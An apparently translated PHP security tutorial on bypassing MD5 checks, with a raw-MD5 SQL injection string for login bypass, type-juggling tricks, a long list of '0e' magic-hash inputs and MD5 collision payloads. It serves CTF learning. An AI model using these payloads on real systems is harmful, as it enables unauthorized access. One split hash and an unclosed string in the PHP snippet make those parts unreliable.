# PHP Safe Learning—MD5

Author: H3rmesk1t

# Bypass md5() to construct attack statements
> Utilization value: ffifdyop
````sql
select * from 'admin' where password = md5($pass,true)
```
> The principle of this point is that `ffifdyop` The string hashed by md5 and will become `276f722736c95d99e921722cf9ed621c`. The first few digits of the string that are converted into hex are just 'or'6, and Mysql just happens to be hex to ascii explanation, so the form after splicing is `select * from 'admin' where password=''or'6xxxxxx'`, which is equivalent to or a permanent truth, so it is equivalent to a universal password, which can bypass the md5() function

# Comparison between numbers and strings

<img src="./images/11.png" alt="">

> The first statement that executes the statement in the above figure returns true , and the second one returns false , because when php converts the letters beginning into integers, it will be converted to 0 , if the letters after the preceding number are only taken before the first letter appears (for example: intval('123abd45gf') the result is 123)

# Array bypass
> Array bypass is suitable for the source code without judging variable types or content. If a filter function is added, it cannot be used.
> Common filtering functions are as follows

```php
ctype_alnum ( string $text ) : bool
// If all characters in text are letters and (or) numbers, return TRUE. Otherwise, return FALSE.

is_numeric ( mixed $var ) : bool
// Return TRUE if var is a numeric and a numeric string, otherwise return FALSE if
```

# Scientific notation bypass
> Bypassing `md5($val1) != md5($val2)`, its principle is 0e. A string with numbers beginning with numbers will be recognized as a scientific notation.

```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
240610708
0e462097431906509019562988736854
314282422
0e990995504821699494520356953734
571579406
0e972379832854295224118025748221
903251147
0e174510503823932942361353209384
1110242161
0e435874558488625891324861198103
1320830526
0e912095958985483346995414060832
1586264293
0e622743671155995737639662718498
2302756269
0e250566888497473798724426794462
2427435592
0e067696952328669732475498472343
2653531602
0e877487522341544758028810610885
3293867441
0e471001201303602543921144570260
3295421201
0e703870333002232681239618856220
3465814713
0e258631645650999664521705537122
3524854780
0e507419062489887827087815735195
3908336290
0e807624498959190415881248245271
4011627063
0e485805687034439905938362701775
4775635065
0e998212089946640967599450361168
4790555361
0e643442214660994430134492464512
5432453531
0e512318699085881630861890526097
5579679820
0e877622011730221803461740184915
5585393579
0e664357355382305805992765337023
6376552501
0e165886706997482187870215578015
7124129977
0e500007361044747804682122060876
7197546197
0e915188576072469101457315675502
7656486157
0e451569119711843337267091732412
QLTHNDT
0e405967825401955372549139051580
QNKCDZO
0e830400451993494058024219903391
EEIZDOI
0e782601363539291779881938479162
TUFEPMC
0e839407194569345277863905212547
UTIPEZQ
0e382098788231234954670291303879
UYXFLOI
0e552539585246568817348686838809
IHKFRNS
0e256160682445802696926137988570
PJNPDWY
0e291529052894702774557631701704
ABJIHVY
0e755264355178451322893275696586
DQWRASX
0e742373665639232907775599582643
DYAXWCA
0e42
4759758842488633464374063001
GEGHBXL
0e248776895502908863709684713578
GGHMVOE
0e362766013028313274586933780773
GZECLQZ
0e537612333747236407713628225676
NWWKITQ
0e763082070976038347657360817689
NOOPCJF
0e818888003657176127862245791911
MAUXXQC
0e478478466848439040434801845361
MMHUWUV
0e701732711630150438129209816536
```
> The values ​​after MD5 and double MD5 are all started with 0e

```
CbDLytmyGm2xQyaLNhWn
770hQgrBOjrcqftrlaZk
7r4lGXCH2Ksu2JNT3BYM
```

> The md5 value starting with 0e is also started with 0e: `0e215962017`

# md5 Collision
> Use fastcoll to perform md5 collisions to generate two strings with different literal values ​​but same md5

```php
if((string)$_POST['param1']!==(string)$_POST['param2'] && md5($_POST['param1'])===md5($_POST['param2'])){
        die("success!);
}

Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

# Expand link
> [Link Address 1](https://binlep.github.io/2020/02/28/%E3%80%90Web%20%E7%AC%94%E8%AE%B0%E3%80%91md5%20%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/)
> [Link Address 2](https://blog.csdn.net/LYJ20010728/article/details/116779357)